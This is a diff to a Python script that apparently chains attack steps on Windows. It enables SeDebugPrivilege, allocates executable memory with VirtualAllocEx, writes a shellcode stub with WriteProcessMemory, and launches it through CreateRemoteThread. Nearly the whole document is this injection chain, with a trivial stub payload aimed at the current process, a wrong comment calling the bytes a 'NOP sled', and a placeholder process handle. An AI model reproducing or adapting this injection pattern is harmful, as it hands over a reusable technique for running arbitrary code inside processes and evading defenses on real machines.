@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
-import sys, json, time
+import sys
+import json
+import time
 from typing import Dict, Any
 import win32security
 import ctypes
@@ -14,19 +16,18 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
             win32security.GetCurrentProcess(),
             win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
         )
-        
+
         # Lookup the privilege value for SeDebugPrivilege
         privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
-        
+
         # Enable the privilege
         new_privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
         win32security.AdjustTokenPrivileges(token, False, new_privileges)
-        
+
         # Check if the privilege was successfully enabled
         has_debug = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
-        has_debug = any(privilege_id == priv[0] and (priv[1] & win32security.SE_PRIVILEGE_ENABLED)
-                        for priv in has_debug)
-        
+        has_debug = any(privilege[0] == privilege_id and privilege[1] == win32security.SE_PRIVILEGE_ENABLED for privilege in has_debug)
+
         result = {'has_debug': has_debug}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
@@ -37,50 +38,50 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
+    result = {'remote_addr': None, 'success': False}
+    
     try:
         has_debug = input_data.get('has_debug', False)
         
-        # Check if we have debug privileges
         if not has_debug:
-            raise PermissionError("Debug privileges are required for this operation.")
-
-        # Example shellcode (NOP sled + RET instruction)
-        shellcode = bytes.fromhex("fc4883e4f0") + b"\xc3"
-
-        # Open a handle to the target process (for demonstration, using current process)
+            raise PermissionError("Insufficient privileges to debug the process.")
+        
+        # Constants
         PROCESS_ALL_ACCESS = 0x1F0FFF
-        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        pid = kernel32.GetCurrentProcessId()
-        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-        if not process_handle:
-            raise ctypes.WinError(ctypes.get_last_error())
-
-        # Allocate memory in the target process
         MEM_COMMIT = 0x1000
         PAGE_EXECUTE_READWRITE = 0x40
-        remote_addr = kernel32.VirtualAllocEx(process_handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        
+        # Example shellcode (NOP sled followed by a simple return)
+        shellcode = bytes.fromhex("fc4883e4f0") + b"\xC3"
+        
+        # Open a handle to the current process
+        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        current_process = kernel32.GetCurrentProcess()
+        
+        # Allocate memory in the current process
+        VirtualAllocEx = kernel32.VirtualAllocEx
+        VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
+        VirtualAllocEx.restype = wintypes.LPVOID
+        
+        remote_addr = VirtualAllocEx(current_process, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
         if not remote_addr:
-            raise ctypes.WinError(ctypes.get_last_error())
-
+            raise MemoryError("Failed to allocate memory in the target process.")
+        
         # Write the shellcode into the allocated memory
-        bytes_written = wintypes.SIZE_T(0)
-        if not kernel32.WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(bytes_written)):
-            raise ctypes.WinError(ctypes.get_last_error())
-
-        # Close the process handle
-        kernel32.CloseHandle(process_handle)
-
-        result = {
-            "remote_addr": remote_addr,
-            "success": True
-        }
+        WriteProcessMemory = kernel32.WriteProcessMemory
+        WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+        WriteProcessMemory.restype = wintypes.BOOL
+        
+        bytes_written = ctypes.c_size_t(0)
+        if not WriteProcessMemory(current_process, remote_addr, shellcode, len(shellcode), ctypes.byref(bytes_written)):
+            raise MemoryError("Failed to write shellcode into the target process memory.")
+        
+        result['remote_addr'] = remote_addr
+        result['success'] = True
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        result = {
-            "remote_addr": None,
-            "success": False
-        }
         return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
@@ -92,39 +93,37 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         remote_addr = input_data.get('remote_addr', 0)
         injection_success = input_data.get('success', False)
 
-        # Initialize result dictionary with fallback values
-        result = {
-            'thread_id': None,
-            'running': False
-        }
+        # Initialize result with default values
+        result = {'thread_id': None, 'running': False}
 
-        # Proceed only if injection was successful
-        if injection_success:
-            # Define necessary Windows API structures and functions
+        if injection_success and remote_addr:
+            # Define necessary Windows API types and constants
+            LPTHREAD_START_ROUTINE = wintypes.LPVOID
+            HANDLE = wintypes.HANDLE
+            DWORD = wintypes.DWORD
+            NULL = 0
+
+            # CreateRemoteThread function
             CreateRemoteThread = windll.kernel32.CreateRemoteThread
-            CreateRemoteThread.argtypes = [
-                wintypes.HANDLE, wintypes.LPVOID, wintypes.SIZE_T,
-                wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD,
-                wintypes.LPVOID
-            ]
-            CreateRemoteThread.restype = wintypes.HANDLE
+            CreateRemoteThread.argtypes = [HANDLE, wintypes.LPVOID, wintypes.SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, DWORD, wintypes.LPDWORD]
+            CreateRemoteThread.restype = HANDLE
 
-            # Assuming a valid process handle is available (for demonstration purposes)
-            process_handle = wintypes.HANDLE(-1)  # Placeholder for a valid handle
+            # Assuming a valid process handle is available (this would typically be obtained during the injection phase)
+            process_handle = HANDLE(0xFFFFFFFF)  # Placeholder for a valid process handle
 
             # Create a remote thread in the target process
-            thread_handle = CreateRemoteThread(
-                process_handle, None, 0, remote_addr, None, 0, byref(wintypes.DWORD())
-            )
+            thread_id = DWORD(0)
+            thread_handle = CreateRemoteThread(process_handle, NULL, 0, LPTHREAD_START_ROUTINE(remote_addr), NULL, 0, byref(thread_id))
 
             if thread_handle:
-                result['thread_id'] = thread_handle
+                result['thread_id'] = thread_id.value
                 result['running'] = True
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'thread_id': None, 'running': False},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def main() -> dict:
@@ -168,16 +167,16 @@ def main() -> dict:
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
     
-    # ── T3: Execute Injected Code [execution] ──
+    # ── T3: Execute Injected Shellcode [execution] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Execute Injected Code): OK')
+            print(f'[+] T3 (Execute Injected Shellcode): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Execute Injected Code): FAILED — {err}')
+            print(f'[-] T3 (Execute Injected Shellcode): FAILED — {err}')
             failed.append('T3')
     except Exception as e:
         print(f'[!] T3 crashed: {e}')
